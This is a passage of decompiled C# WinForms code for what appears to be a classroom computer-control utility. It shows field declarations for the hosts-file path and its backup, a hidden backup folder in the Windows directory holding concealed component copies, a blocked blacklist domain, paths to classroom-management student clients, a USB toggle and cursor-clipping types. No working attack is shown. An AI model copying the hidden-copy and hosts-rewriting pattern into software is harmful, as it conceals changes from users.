		/// 控件 RadioButton20 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000048 RID: 72
		[AccessedThroughProperty("RadioButton20")]
		private RadioButton m_RadioButton20;

		/// <summary>
		/// 控件 Label22 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x04000049 RID: 73
		[AccessedThroughProperty("Label22")]
		private Label m_Label22;

		/// <summary>
		/// 控件 Label23 的后备字段（属性访问器自动生成）。
		/// </summary>
		// Token: 0x0400004A RID: 74
		[AccessedThroughProperty("Label23")]
		private Label m_Label23;

		/// <summary>
		/// hosts 文件路径：%SystemRoot%\drivers\etc\hosts（用于读写/备份/设属性）。
		/// </summary>
		// Token: 0x0400004B RID: 75
		private string hostsFilePath;

		/// <summary>
		/// hosts 备份路径：%SystemRoot%\drivers\etc\hosts-bak（保存前备份）。
		/// </summary>
		// Token: 0x0400004C RID: 76
		private string hostsBackupPath;

		/// <summary>
		/// 隐藏备份目录：c:\windows\jf（jfglzsn/przs/zmserv 的 .dat 隐藏副本存放处）。
		/// </summary>
		// Token: 0x0400004D RID: 77
		private string hiddenBackupDir;

		/// <summary>
		/// 黑名单服务器域名：www.zmyxl2008.com（既是 hosts 屏蔽对象又是 hmd_net.txt 黑名单源）。
		/// </summary>
		// Token: 0x0400004E RID: 78
		private string blacklistServerDomain;

		/// <summary>
		/// 混淆残留未使用字段（反编译遗留，代码未引用）。
		/// </summary>
		// Token: 0x0400004F RID: 79
		private string unusedField_String_1;

		/// <summary>
		/// 混淆残留未使用字段（反编译遗留，代码未引用）。
		/// </summary>
		// Token: 0x04000050 RID: 80
		private string unusedField_String_2;

		/// <summary>
		/// hosts 绝对路径：C:\Windows\System32\drivers\etc\hosts（UpdateHostsBlacklist 写回用）。
		/// </summary>
		// Token: 0x04000051 RID: 81
		private string hostsAbsolutePath;

		/// <summary>
		/// 黑名单是否应用成功标记（UpdateHostsBlacklist 写标志，后续流程依据）。
		/// </summary>
		// Token: 0x04000052 RID: 82
		private bool blacklistApplied;

		/// <summary>
		/// 混淆残留未使用常量（反编译遗留 =20，代码未引用）。
		/// </summary>
		// Token: 0x04000053 RID: 83
		private const int unusedConst_20 = 20;

		/// <summary>
		/// 混淆残留未使用常量（反编译遗留 =1，代码未引用）。
		/// </summary>
		// Token: 0x04000054 RID: 84
		private const int unusedConst_1 = 1;

		/// <summary>
		/// 混淆残留未使用常量（反编译遗留 =2，代码未引用）。
		/// </summary>
		// Token: 0x04000055 RID: 85
		private const int unusedConst_2 = 2;

		/// <summary>
		/// 学生端程序路径（极域 StudentMain.exe / 锐捷 ClassMangerApp.exe / 红蜘蛛 REDAgent.exe，或手动选择）。
		/// </summary>
		// Token: 0x04000056 RID: 86
		private string studentExePath;

		/// <summary>
		/// USB 检查开关值（"off"/"on"，对应 RadioButton 状态）。
		/// </summary>
		// Token: 0x04000057 RID: 87
		private string usbCheckValue;

		/// <summary>
		/// 壁纸拉伸样式枚举：Tiled=1（平铺）、Centered=2（居中）、Stretched=6（拉伸）。
		/// </summary>
		// Token: 0x02000009 RID: 9
		public enum WallpaperStyle
		{
			// Token: 0x04000059 RID: 89
			Tiled = 1,
			// Token: 0x0400005A RID: 90
			Centered,
			// Token: 0x0400005B RID: 91
			Stretched = 6
		}

		/// <summary>
		/// ClipCursor 用矩形结构（Left/Top/Right/Bottom）。
		/// </summary>
		// Token: 0x0200000A RID: 10
		public struct RECT
		{
			// Token: 0x0400005C RID: 92
			public int Left;

			// Token: 0x0400005D RID: 93
			public int Top;

			// Token: 0x0400005E RID: 94
			public int Right;

			// Token: 0x0400005F RID: 95
			public int Bottom;
		}
	}
}
